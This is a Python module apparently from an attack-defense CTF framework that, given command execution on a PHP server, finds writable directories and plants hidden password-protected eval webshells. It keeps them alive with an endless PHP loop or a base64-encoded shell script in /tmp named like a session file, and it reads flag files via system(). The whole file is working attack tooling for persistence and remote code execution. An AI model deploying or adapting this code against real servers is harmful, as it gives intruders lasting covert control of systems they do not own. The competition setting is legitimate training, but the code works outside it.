#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 通过任意命令执行达到权限维持的效果

import requests
import random
import string
import hashlib
import traceback
from Attack_Defense_Framework_master import debug
from module.php.config import salt_key , shell_timeout
from module.tool import get_host_port , log_success , log_fail
from base64 import b64encode

# salt_key = "fantasy"
# wait_time = 300
# shell_timeout = 1 # core.php.shell
n_md5 = lambda text : hashlib.md5(text.encode("utf-8")).hexdigest()

def get_flag(url , password , salt_key):
    data = {
        "key1" : salt_key,
        password : "system('cat /fla*');"
    }
    # just joker
    headers = {
        "Referer":"cxk is very beautidul!"
    }
    # get result
    response = requests.post(url, headers=headers,data = data, timeout = shell_timeout)
    if response.status_code != 200: # 处理响应码异常
        return None
    content = response.text
    try:
        flag = content.replace("\n","")
        return flag
    except:
        print("Fixed!")
        return None

def get_password(host, port):
    return n_md5(salt_key + host + ":" + port)


def get_shell_content(password):
    key1 = n_md5(n_md5(salt_key))
    return '<?php if(md5(md5($_REQUEST[key1])) == "%s"){\neval($_REQUEST["%s"]);}?>' % (key1 , password)

def random_string(length):
    result = [random.choice(string.ascii_letters) for i in range(length)]
    return "".join(result)


def shell_exec(url, key, code , active = False):
    flag = "->|"
    if code[-1] == ";":
        code = code[:-1]
    tmp = "echo '%s';%s;echo '%s';" % (flag, code, flag)

    data = {
        key: "echo '%s';%s;echo '%s';" % (flag, code, flag)
    }
    try:
        response = requests.post(url , data=data,timeout=shell_timeout)
        content = response.text
        # print(content.split(flag))
        if flag in content:
            return content.split(flag)[1]
        return content
    except requests.exceptions.ReadTimeout:
        return True
    except Exception as e:
        print(("[-] %s" % (e)))
        print(url)
        if debug is True:
            traceback.print_exc()
        return ""

def code_exec(url, key, command):
    flag = "->|"
    if command[-1] == ";":
        command = command[:-1]
    data = {
        # "a":"%s && echo '%s';" % (command, flag)
        key: '''print('{}');{};print('{}');'''.format(flag , command , flag)
    }

    try:
        response = requests.post(url, data=data, timeout=shell_timeout)

        if response.status_code != 200:
            return ""
        content = response.text
        # print(content)
        if "->|" in content:
            return content.split(flag)[1]
        return ""
    except Exception as e:
        print(("[-] %s" % (e)))
        if debug is True:
            traceback.print_exc()
        return ""


def get_writable_dir_code(url, key, root):
    code = """function scan($path){
    if(is_writable($path.'/'.$file)){ 
        echo $path.'/'.$file.\"\n\"; 
    }  
    foreach(scandir($path) as $file){ 
        if($file == '.' || $file == '..'){
            continue;
        } 
        if(is_dir($path.'/'.$file)){ 
            scan($path.'/'.$file); 
        } 
    } 
} 
scan('%s');"""
    code = code % root

    payload = "eval(base64_decode('{}'));".format(b64encode(code.encode("utf-8")).decode("utf-8"))
    content = code_exec(url, key, payload)

    dir_list = list(set(content.split('\n')))
    if "" in dir_list:
        dir_list.remove("")
    dir_list = [dir[:-1] if dir[-1] == '/' else dir for dir in dir_list]

    return dir_list


def get_writable_dir_shell(url, key, root):
    command = "find %s -type d -writable" % (root)
    print(("[+] Executing : [%s]" % (command)))
    content = shell_exec(url, key, command)
    dir_list = list(set(content.split('\n')))
    dir_list.remove("")
    #print(result)
    return dir_list


def write_memery_webshell(url, key, directory, password):
    sleep_time = 500  # micro second
    code = '''<?php 
    $content = '%s'; 
    $writable_path = "%s"; 
    $filename = '.%s.php'; 
    $path = $writable_path.'/'.$filename; 
    ignore_user_abort(true); 
    set_time_limit(0); 
    while(true){
        if(file_get_contents($path) != $content){
            file_put_contents($path, $content); 
        } 
        usleep(%d); 
    }?>''' % (get_shell_content(password), directory, password, sleep_time)
    filename = ".%s.php" % (password)
    path = "%s/%s" % (directory, filename)
    payload = "file_put_contents('{file_path}', base64_decode('{file_conctent}'));".format(file_path = path, file_conctent = b64encode(code.encode("utf-8")).decode("utf-8"))

    return code_exec(url, key, payload).split("\n")[0:-1]


def active_memery_webshell(url):
    try:
        resp = requests.get(url, timeout=0.5)
        if resp.status_code == 200:
            return True # exist and already active
        return False # not exist
    except requests.exceptions.ReadTimeout:
        return True
    except Exception as e:
        if debug is True:
            traceback.print_exc()
        return False



def shell(url, key, root="/var/www/html", type="code"):
    shell_list = []
    host , port = get_host_port(url)

    password = get_password(host, port)
    writable_dirs = []
    # print("[+] Getting writable dirs...")
    if type == 'code':
        writable_dirs = get_writable_dir_code(url, key, root[:-1])
    elif type == 'shell':
        writable_dirs = get_writable_dir_shell(url, key, root)

    # writable_dirs = writable_dirs[:10] # debug


    if len(writable_dirs) != 0:
        print("[+] Writable dirs : ", writable_dirs)
        for writable_dir in writable_dirs:
            webshell_url = "http://{host}:{port}/{path}/.{filename}.php".format(host = host, port = port, path = writable_dir.replace(root, "") , filename = password)
            if type == "code":
                write_memery_webshell(url, key, writable_dir, password)
                # print("[+] Activing memery webshell...")
                if active_memery_webshell(webshell_url) is True:
                    shell_list.append(webshell_url)
                    log_success(("Webshell : {webshell_url} active success".format(webshell_url = webshell_url)))
            elif type == "shell":
                commands = []
                fake_filename = random_string(0x10)
                filename = "SESS_%s" % (fake_filename)
                path = "/tmp/%s" % (filename)
                shell_content = b64encode(get_shell_content(password).encode("utf-8")).decode("utf-8")
                shell_path = "{dir}/.{filename}.php".format(dir = writable_dir, filename = password)
                real_command = """#!/bin/sh
                while :
                do
                echo '{shell_content}' | base64 -d > {shell_path}
                sleep 0.1
                done
                """.format(shell_content = shell_content, shell_path = shell_path)

                # commands.append("rm -rf %s" % (path))
                commands.append("echo '{content}' | base64 -d > {path}".format(content = b64encode(real_command.encode("utf-8")).decode("utf-8"), path = path))
                commands.append("chmod o+x {}".format(path))
                commands.append("bash -x {}".format(path))
                #print(commands)
                for command in commands:
                    if shell_exec(url, key, command , active = True) is True:
                        shell_list.append(webshell_url)
                        log_success(("Webshell : {webshell_url} active success".format(webshell_url = webshell_url)))
    # else :
    #     print(("[!] %s Can Find Any Writable Dirs!" % url))

    bRet = True if len(shell_list) != 0 else False
    return [bRet , password , shell_list]




if __name__ == "__main__":
    shell("http://172.16.5.10:5050", 'HDwiki', root = '/var/www/html', type="code")